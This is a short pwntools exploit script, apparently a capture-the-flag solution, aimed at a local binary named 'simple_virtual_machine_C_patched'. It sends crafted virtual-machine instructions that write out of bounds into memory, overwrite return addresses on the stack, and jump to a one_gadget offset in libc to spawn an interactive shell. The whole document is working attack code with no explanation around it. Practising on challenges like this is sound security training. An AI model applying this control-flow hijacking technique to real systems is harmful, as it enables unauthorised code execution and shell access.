from pwn import *

exe = './simple_virtual_machine_C_patched'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * main
b * vm_exec+1658
b * vm_exec+175
'''.format(**locals())


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

p.sendline((# overwrite the data section with the actual stack pointer
              p32(0xa) + p32(0xffffffff-0x3e4+0x1) 
            + p32(0xc) + p32(0xffffffff-0x3e4+0x5) 
            + p32(0xa) + p32(0xffffffff-0x3e4)     
            + p32(0xc) + p32(0xffffffff-0x3e4+0x4) 
            # overwrite the return address on the stack to main's leave ret instruction (current+0x28)
            + p32(0xb) + p32(0xfffffff6)
            + p32(0x9) + p32(0x28) + p32(0x1)
            + p32(0xd) + p32(0xfffffff6) 
            # overwrite the return address of main to a one_gadget
            + p32(0xb) + p32(0x86)
            + p32(0x9) + p32(0xbfbce) + p32(0x1)
            + p32(0xd) + p32(0x86)
            # meet conditions to get out of the vm successfully
            + p32(0x9) + p32(0x0)
            + p32(0xd) + p32(0xfffffff6-0x12)
            + p32(0x9) + p32(0x12)
            + p32(0xd) + p32(0x0)
            + p32(0x9) + p32(0x0)
            + p32(0xd) + p32(0xffffffff-0x17+1)
            # returning back to main 
            + p32(0x11)

            ).ljust(512,b"\x00"))

p.interactive()